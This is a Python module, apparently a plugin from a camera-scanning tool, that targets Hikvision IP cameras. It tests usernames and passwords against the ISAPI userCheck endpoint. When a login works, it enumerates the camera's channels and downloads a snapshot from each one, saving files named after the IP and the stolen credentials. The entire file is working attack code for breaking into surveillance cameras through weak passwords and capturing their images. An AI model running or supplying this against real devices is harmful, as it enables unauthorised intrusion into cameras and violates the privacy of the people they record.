import requests
from requests.auth import HTTPDigestAuth
from xml.etree import ElementTree

from .base import WeakPasswordPOC


class HikvisionWeakPassword(WeakPasswordPOC):
    product_key = 'hikvision'

    def _check(self, ip, port, user, password):
        r = requests.get(f"http://{ip}:{port}/ISAPI/Security/userCheck",
                         auth=(user, password), headers=self.headers,
                         timeout=self.config.timeout, verify=False)
        return (r.status_code == 200
                and 'userCheck' in r.text
                and 'statusValue' in r.text
                and '200' in r.text)

    def exploit(self, results):
        ip, port, _, user, password, _ = results
        channels = 1
        try:
            res = requests.get(f"http://{ip}:{port}/ISAPI/Image/channels",
                               auth=HTTPDigestAuth(user, password), headers=self.headers,
                               timeout=self.config.timeout, verify=False)
            channels = len(ElementTree.fromstring(res.text))
        except Exception:
            pass
        res_list = []
        for ch in range(1, channels + 1):
            url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{ch}01/picture"
            res_list.append(self._snapshot(url, f"{ip}-{port}-channel{ch}-{user}-{password}.jpg",
                                           auth=HTTPDigestAuth(user, password)))
        return sum(res_list)
